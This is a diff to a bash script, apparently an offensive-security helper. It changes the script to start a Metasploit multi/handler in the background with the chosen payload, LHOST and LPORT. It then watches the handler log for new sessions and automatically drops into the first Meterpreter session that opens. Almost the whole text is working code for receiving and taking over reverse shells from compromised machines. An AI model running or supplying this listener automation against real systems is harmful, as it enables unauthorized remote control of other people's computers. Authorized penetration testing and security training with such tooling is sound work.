@@ -315,7 +315,76 @@ echo -e "${YELLOW}Would you like to start the listener now? (y/n): ${NC}"
 read -p "" START_LISTENER
 
 if [[ "$START_LISTENER" =~ ^[Yy]$ ]]; then
-    echo -e "${YELLOW}[*] Starting Metasploit listener...${NC}"
+    echo -e "${YELLOW}[*] Starting Metasploit listener in background...${NC}"
     echo ""
-    msfconsole -r "$RC_FILE"
+
+    # Create an enhanced RC file that auto-interacts with new sessions
+    INTERACTIVE_RC_FILE="/tmp/handler_interactive_$$.rc"
+
+    cat > "$INTERACTIVE_RC_FILE" << 'MSFEOF'
+use exploit/multi/handler
+MSFEOF
+
+    cat >> "$INTERACTIVE_RC_FILE" << EOF
+set PAYLOAD $PAYLOAD
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+exploit -j
+EOF
+
+    # Start listener in background with output to log
+    HANDLER_LOG="/tmp/msfconsole_handler_$$.log"
+    echo -e "${YELLOW}[*] Handler output: $HANDLER_LOG${NC}"
+    msfconsole -r "$INTERACTIVE_RC_FILE" > "$HANDLER_LOG" 2>&1 &
+    HANDLER_PID=$!
+    echo -e "${GREEN}[+] Handler running in background (PID: $HANDLER_PID)${NC}"
+    echo ""
+
+    # Monitor for new sessions and auto-interact
+    echo -e "${YELLOW}[*] Waiting for incoming session...${NC}"
+    SESSION_DETECTED=0
+    CHECK_COUNT=0
+    MAX_CHECKS=120  # 2 minutes timeout
+
+    while [ $CHECK_COUNT -lt $MAX_CHECKS ] && [ $SESSION_DETECTED -eq 0 ]; do
+        if grep -q "Session [0-9]* opened" "$HANDLER_LOG" 2>/dev/null; then
+            SESSION_DETECTED=1
+            # Extract session ID
+            SESSION_ID=$(grep "Session [0-9]* opened" "$HANDLER_LOG" | tail -1 | sed 's/.*Session \([0-9]*\).*/\1/')
+
+            if [ ! -z "$SESSION_ID" ]; then
+                echo -e "${GREEN}[+] Session detected! (Session ID: $SESSION_ID)${NC}"
+                echo ""
+                sleep 1
+
+                # Create RC file to auto-interact with the session
+                SESSION_RC="/tmp/session_interact_$$.rc"
+                cat > "$SESSION_RC" << SESSEOF
+sessions -i $SESSION_ID
+SESSEOF
+
+                echo -e "${YELLOW}[*] Launching Meterpreter session...${NC}"
+                echo ""
+                msfconsole -r "$SESSION_RC"
+                break
+            fi
+        fi
+
+        sleep 1
+        CHECK_COUNT=$((CHECK_COUNT + 1))
+        printf "."
+    done
+
+    if [ $SESSION_DETECTED -eq 0 ]; then
+        echo ""
+        echo -e "${YELLOW}[*] No session detected within timeout.${NC}"
+        echo -e "${YELLOW}[*] Handler still running in background (PID: $HANDLER_PID)${NC}"
+        echo -e "${YELLOW}[*] Check log at: $HANDLER_LOG${NC}"
+        echo ""
+        echo -e "${GREEN}[+] To manually interact with a session, run:${NC}"
+        echo -e "${GREEN}  msfconsole${NC}"
+        echo -e "${GREEN}  > sessions -l${NC}"
+        echo -e "${GREEN}  > sessions -i <SESSION_ID>${NC}"
+    fi
 fi
